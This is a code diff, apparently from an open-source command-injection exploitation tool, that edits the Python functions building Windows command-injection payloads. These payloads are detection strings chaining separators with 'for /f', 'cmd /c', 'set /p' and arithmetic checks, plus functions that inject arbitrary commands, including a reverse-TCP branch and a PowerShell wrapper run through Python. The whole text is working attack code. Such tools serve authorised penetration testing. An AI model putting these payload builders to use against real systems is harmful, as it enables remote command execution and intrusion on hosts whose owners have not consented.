@@ -26,15 +26,19 @@ Classic decision payload (check if host is vulnerable).
 """
 def decision(separator, TAG, randv1, randv2):
   if settings.TARGET_OS == settings.OS.WINDOWS:
+    chain = checks.windows_separator(separator)
+    if chain is None:
+      return ""
     if settings.SKIP_CALC:
-      payload = (separator +
-                "echo " + TAG + TAG + TAG + settings.CMD_NUL
+      payload = (chain +
+                "echo " + TAG + TAG + TAG
                 )
     else:
-        payload = (separator +
+      # 'set /p' prints its prompt without a trailing newline, so the marker arrives in one piece.
+      payload = (chain +
               "for /f \"tokens=*\" %i in ('cmd /c \"" +
               "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" +
-              "\"') do @set /p = " + TAG + "%i" + TAG + TAG + settings.CMD_NUL
+              "\"') do @set /p=" + TAG + "%i" + TAG + TAG + settings.CMD_NUL + checks.WINDOWS_TAIL
               )
   else:
     if settings.USE_BACKTICKS or settings.WAF_ENABLED:
@@ -63,15 +67,18 @@ __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_interpreter(separator, TAG, randv1, randv2):
   if settings.TARGET_OS == settings.OS.WINDOWS:
+    chain = checks.windows_separator(separator)
+    if chain is None:
+      return ""
     if settings.SKIP_CALC:
       python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'" + TAG + "')\""
     else:
       python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + TAG + "'%2B'" + TAG + "')\""
 
-    payload = (separator +
+    payload = (chain +
               "for /f \"tokens=*\" %i in ('cmd /c " +
               python_payload +
-              "') do @set /p=%i " + settings.CMD_NUL
+              "') do @set /p=%i" + settings.CMD_NUL + checks.WINDOWS_TAIL
               )
   else:
     if settings.SKIP_CALC:
@@ -97,15 +104,18 @@ Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, TAG, cmd):
   if settings.TARGET_OS == settings.OS.WINDOWS:
+    chain = checks.windows_separator(separator)
+    if chain is None:
+      return ""
     if settings.REVERSE_TCP:
-      payload = (separator + 
+      payload = (chain +
                 cmd + settings.SINGLE_WHITESPACE
                 )
     else:
-      payload = (separator +
+      payload = (chain +
                 "for /f \"tokens=*\" %i in ('cmd /c \"" +
                 cmd +
-                "\"') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + settings.CMD_NUL
+                "\"') do @set /p=" + TAG + TAG + "%i" + TAG + TAG + settings.CMD_NUL + checks.WINDOWS_TAIL
                 )
   else:
     settings.USER_APPLIED_CMD = cmd
@@ -126,17 +136,21 @@ __Warning__: The alternative shells are still experimental.
 """
 def cmd_execution_alter_interpreter(separator, TAG, cmd):
   if settings.TARGET_OS == settings.OS.WINDOWS:
+    chain = checks.windows_separator(separator)
+    if chain is None:
+      return ""
     if settings.REVERSE_TCP:
-      payload = (separator + 
+      payload = (chain +
                 cmd + settings.SINGLE_WHITESPACE
                 )
     else:
-      payload = (separator +
+      # Run through 'cmd /c', or PowerShell would look the command up among its own cmdlets.
+      payload = (chain +
                 "for /f \"tokens=*\" %i in ('" +
-                settings.WIN_PYTHON_INTERPRETER + 
-                " -c \"import os; os.system('powershell.exe -InputFormat none write-host " + 
-                TAG + TAG + " $(" + cmd + ") "+ TAG + TAG + "')\"" +
-                "') do @set /p=%i " + settings.CMD_NUL
+                settings.WIN_PYTHON_INTERPRETER +
+                " -c \"import os; os.system('powershell.exe -InputFormat none write-host " +
+                TAG + TAG + " $(cmd /c " + cmd + ") "+ TAG + TAG + "')\"" +
+                "') do @set /p=%i" + settings.CMD_NUL + checks.WINDOWS_TAIL
                 )
   else:
     settings.USER_APPLIED_CMD = cmd
